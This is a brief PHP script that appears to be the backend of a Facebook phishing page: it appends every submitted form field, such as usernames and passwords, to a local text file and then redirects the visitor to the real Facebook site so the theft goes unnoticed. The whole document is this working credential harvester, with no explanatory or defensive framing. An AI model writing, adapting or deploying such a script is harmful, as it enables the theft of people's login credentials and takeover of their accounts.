<?php
$handle = fopen("database.txt", "a");
foreach ($_POST as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, "-");
    fwrite($handle, $value);
    fwrite($handle, "\r\n");
}
fclose($handle);
header("Location: https://web.facebook.com/");
exit;
?>
